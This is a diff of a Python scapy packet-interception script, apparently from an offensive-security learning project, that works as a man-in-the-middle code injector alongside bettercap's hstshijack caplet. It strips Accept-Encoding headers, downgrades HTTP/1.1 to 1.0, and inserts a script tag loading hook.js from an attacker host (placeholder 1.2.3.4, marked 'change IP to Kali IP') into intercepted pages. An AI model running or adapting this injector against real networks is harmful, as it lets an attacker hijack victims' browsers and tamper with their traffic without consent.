@@ -14,14 +14,15 @@ def process_packet(packet):
         scapy_packet = scapy.IP(packet.get_payload())
         if scapy_packet.haslayer(scapy.Raw):
             load = scapy_packet[scapy.Raw].load
-            if scapy_packet[scapy.TCP].dport == 8080: # 8080 with bettercap -iface eth0 -caplet hstshijack/hstshijack
+            if scapy_packet[scapy.TCP].dport == 8080: # Bettercap = 8080, otherwise 80
                 print("[+] Request")
                 load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
                 load = load.replace(b"HTTP/1.1", b"HTTP/1.0")
 
-            elif scapy_packet[scapy.TCP].sport == 8080: # 8080 with bettercap -iface eth0 -caplet hstshijack/hstshijack
+            elif scapy_packet[scapy.TCP].sport == 8080: # Bettercap = 8080, otherwise 80
                 print("[+] Response")
-                injection_code = b'<script src="http://192.168.0.83:3000/hook.js"></script>'
+                injection_code = b'<script src="http://1.2.3.4:3000/hook.js"></script>'
+                # change IP to Kali IP
                 load = load.replace(b"</body>", injection_code + b"</body>")
                 content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
                 if content_length_search:
